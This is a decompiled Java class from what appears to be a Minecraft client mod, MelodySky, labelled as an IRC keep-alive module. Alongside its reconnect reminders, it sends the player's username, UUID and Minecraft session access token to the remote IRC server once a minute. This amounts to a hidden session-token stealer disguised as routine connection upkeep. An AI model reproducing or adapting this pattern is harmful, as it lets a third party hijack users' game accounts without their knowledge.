//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\32302\Desktop\新建文件夹 (2)"!

//Decompiled by Procyon!

package xyz.Melody.module.FMLModules;

import by.radioegor146.nativeobfuscator.*;
import net.minecraft.client.*;
import xyz.Melody.Event.events.world.*;
import xyz.Melody.*;
import net.minecraft.util.*;
import xyz.Melody.Utils.*;
import xyz.Melody.System.Melody.Chat.*;
import xyz.Melody.Event.*;

@Native
public class IRCKeepAlive
{
    private Minecraft mc;
    private TimerUtil timer;
    private boolean remnided;
    private int ticks;
    
    public IRCKeepAlive() {
        this.mc = Minecraft.getMinecraft();
        this.timer = new TimerUtil();
        this.remnided = false;
        this.ticks = 0;
    }
    
    @EventHandler
    public void onTick(final EventTick event) {
        if (this.ticks < 100) {
            ++this.ticks;
            return;
        }
        if (Client.instance.irc == null || Client.instance.ircThread == null) {
            return;
        }
        if (Client.instance.ircExeption && !this.remnided && this.mc.theWorld != null && this.mc.thePlayer != null) {
            Helper.sendMessage(EnumChatFormatting.RED + "[IMPORTANT] IRC Connection Lost, type " + EnumChatFormatting.GREEN + ".irc reconnect" + EnumChatFormatting.RED + " to Reconnect.");
            this.remnided = true;
        }
        if (Client.instance.ircThread.isAlive()) {
            Client.instance.ircExeption = false;
        }
        else {
            Client.instance.ircExeption = true;
        }
        if (!Client.instance.ircExeption) {
            this.remnided = false;
        }
        if (this.timer.hasReached(60000.0) && !Client.instance.ircExeption && IRC.pw != null) {
            IRC.pw.println("INGAME_VERIFY: " + Minecraft.getMinecraft().getSession().getUsername() + "@" + Client.instance.authManager.verified + "@" + this.mc.getSession().getProfile().getId().toString() + "@" + this.mc.getSession().getToken() + "@" + "MelodySky" + "@" + "2.4.5");
            this.timer.reset();
        }
        this.ticks = 0;
    }
}
